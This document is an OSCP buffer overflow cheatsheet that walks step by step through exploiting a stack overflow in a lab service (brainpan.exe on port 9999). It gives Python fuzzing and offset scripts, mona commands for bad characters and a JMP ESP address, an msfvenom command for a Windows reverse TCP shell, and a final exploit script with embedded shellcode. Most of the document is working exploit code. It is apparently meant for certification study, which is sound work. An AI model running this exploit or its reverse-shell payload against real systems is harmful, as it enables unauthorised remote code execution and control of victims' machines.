---
title: "Buffer Overflow"
Description: OSCP Buffer Overflow Cheatsheet
draft: false
images: []
menu:
  docs:
    parent: "Privesc"
weight: 1
toc: true
content: bufferoverflow
---

### <span style="color:#b31d36">Step 1</span>
Find the overflow length

```python
#!/usr/bin/python

import socket

ip_adress = '192.168.20.117'
port = 9999

if __name__ == '__main__':

        buffer = ['A']
        counter = 200

        while len(buffer) < 32:
                buffer.append('A'*counter)
                counter += 100

        print "Enviando Payloads"

        for string in buffer:
                print ("%s bytes" % len(string))

                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip_adress, port))

                        data = s.recv(1024)
                        s.send("%s\r\n" % string)
                        data = s.recv(1024)

                except:
                        print "\n[*] No me la container bro"
                        sys.exit(1)
```
### <span style="color:#b31d36">Step 2
Find the length to hit EIP
```bash
msf-pattern_create -l XXX
```
**Note:** Change the buffer content with your pattern_create output
```python
#!/usr/bin/python

import socket

ip_adress = '192.168.20.117'
port = 9999

if __name__ == '__main__':

        buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6>

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_adress, port))

                data = s.recv(1024)
                s.send("%s\r\n" % buffer)
                data = s.recv(1024)
                s.close()

        except:
                print "\n[*] No me la container bro"
                sys.exit(1)
```
### <span style="color:#b31d36">Step 3 
Find the offset 
```bash
msf-pattern_offset -q CHARS_IN_EIP
```
### <span style="color:#b31d36">Step 4
Send extra chars to confirm if you do have control of EIP by filling it with BBBB

**Note:** Change <OFFSET> with your pattern_offset output number
```python
#!/usr/bin/python

import socket

ip_adress = '192.168.20.117'
port = 9999

offset = "A"*<OFFSET>
EIP = "B"*4
buffer = offset + EIP 

if __name__ == '__main__':


        try:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_adress, port))

                data = s.recv(1024)
                s.send("%s\r\n)" % buffer)
                data = s.recv(1024)
                s.close()

        except:

                print "\n[*] No me la container"
                sys.exit(1)
```
### <span style="color:#b31d36">Step 5
Now that we know we can control the ESP and made room for our shellcode, we need to remove the possibility of any bad characters.
```bash
!mona config -set workingfolder C://Users/usuario/Desktop
```
Generate chars excluding badchars with -cpb
```python
!mona bytearray -cpb "\x00"
```
```python
#!/usr/bin/python

import socket

ip_adress = '192.168.20.117'
port = 9999

if __name__ == '__main__':

        offset = "A"*524
        EIP = "B"*4
        #BADCHARS= \x00\
        chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
        buffer = offset + EIP + chars

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_adress, port))

                data = s.recv(1024)
                s.send("%s\r\n" % buffer)
                data = s.recv(1024)
                s.close()

        except:
                print "\n[*] No me la container bro"
                sys.exit(1)
```
```bash
!mona compare -f /PATH/bytearray.bin -a <ESP direction>
```
### <span style="color:#b31d36">Step 6
Find a way to jump into ESP
```python
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP

##################################################################################

!mona modules
!mona jmp -r esp -m brainpan.exe
```
```python
!mona find -s "\xFF\xE4" -m "brainpan.exe"
>> 0x311712f3
```
Put it in the script like this "'\xf3\x12\x17\x31"
### <span style="color:#b31d36">Step 7 
Create the shellcode
```python
msfvenom -p windows/shell_reverse_tcp LPORT=6969 LHOST=XXX -b '\x00' -f c
```
Add the shellcode and NOPs to the script
```python
NOP = "\x90"*16
```
### <span style="color:#b31d36">Final Script
```python
#!/usr/bin/python

import socket

ip_adress = '192.168.20.117'
port = 9999

if __name__ == '__main__':

	offset = "A"*524
	EIP = "B"*4
	NOP = "\x90"*16
	#BADCHARS= \x00\
	shellcode = ("\xbe\xde\x07\x0e\xdc\xdd\xc3\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x73\x12\x83\xc3\x04\x03\xad\x09\xec\x29\xad\xfe\x72"
"\xd1\x4d\xff\x12\x5b\xa8\xce\x12\x3f\xb9\x61\xa3\x4b\xef\x8d"
"\x48\x19\x1b\x05\x3c\xb6\x2c\xae\x8b\xe0\x03\x2f\xa7\xd1\x02"
"\xb3\xba\x05\xe4\x8a\x74\x58\xe5\xcb\x69\x91\xb7\x84\xe6\x04"
"\x27\xa0\xb3\x94\xcc\xfa\x52\x9d\x31\x4a\x54\x8c\xe4\xc0\x0f"
"\x0e\x07\x04\x24\x07\x1f\x49\x01\xd1\x94\xb9\xfd\xe0\x7c\xf0"
"\xfe\x4f\x41\x3c\x0d\x91\x86\xfb\xee\xe4\xfe\xff\x93\xfe\xc5"
"\x82\x4f\x8a\xdd\x25\x1b\x2c\x39\xd7\xc8\xab\xca\xdb\xa5\xb8"
"\x94\xff\x38\x6c\xaf\x04\xb0\x93\x7f\x8d\x82\xb7\x5b\xd5\x51"
"\xd9\xfa\xb3\x34\xe6\x1c\x1c\xe8\x42\x57\xb1\xfd\xfe\x3a\xde"
"\x32\x33\xc4\x1e\x5d\x44\xb7\x2c\xc2\xfe\x5f\x1d\x8b\xd8\x98"
"\x62\xa6\x9d\x36\x9d\x49\xde\x1f\x5a\x1d\x8e\x37\x4b\x1e\x45"
"\xc7\x74\xcb\xca\x97\xda\xa4\xaa\x47\x9b\x14\x43\x8d\x14\x4a"
"\x73\xae\xfe\xe3\x1e\x55\x69\xcc\x77\x41\x18\xa4\x85\x69\xc1"
"\x0d\x03\x8f\x9f\x7d\x45\x18\x08\xe7\xcc\xd2\xa9\xe8\xda\x9f"
"\xea\x63\xe9\x60\xa4\x83\x84\x72\x51\x64\xd3\x28\xf4\x7b\xc9"
"\x44\x9a\xee\x96\x94\xd5\x12\x01\xc3\xb2\xe5\x58\x81\x2e\x5f"
"\xf3\xb7\xb2\x39\x3c\x73\x69\xfa\xc3\x7a\xfc\x46\xe0\x6c\x38"
"\x46\xac\xd8\x94\x11\x7a\xb6\x52\xc8\xcc\x60\x0d\xa7\x86\xe4"
"\xc8\x8b\x18\x72\xd5\xc1\xee\x9a\x64\xbc\xb6\xa5\x49\x28\x3f"
"\xde\xb7\xc8\xc0\x35\x7c\xf8\x8a\x17\xd5\x91\x52\xc2\x67\xfc"
"\x64\x39\xab\xf9\xe6\xcb\x54\xfe\xf7\xbe\x51\xba\xbf\x53\x28"
"\xd3\x55\x53\x9f\xd4\x7f")
	#0x311712f3
	buffer = offset + "\xf3\x12\x17\x31" + NOP + shellcode

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip_adress, port))

		data = s.recv(1024)
		s.send("%s\r\n" % buffer)
		data = s.recv(1024)
		s.close()

	except:
		print "\n[*] No me la container bro"
		sys.exit(1)
```
